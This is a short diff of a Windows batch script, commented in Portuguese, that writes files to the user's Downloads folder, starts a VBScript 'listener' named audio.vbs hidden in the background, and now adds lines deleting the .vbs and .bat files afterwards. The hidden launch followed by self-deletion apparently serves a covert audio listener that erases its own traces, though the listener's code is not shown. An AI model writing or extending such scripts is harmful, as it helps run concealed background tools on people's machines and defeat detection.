@@ -18,4 +18,8 @@ echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"
 
+:: Deletar .vbs .bat
+del audio.vbs
+del audio.bat
+
 exit
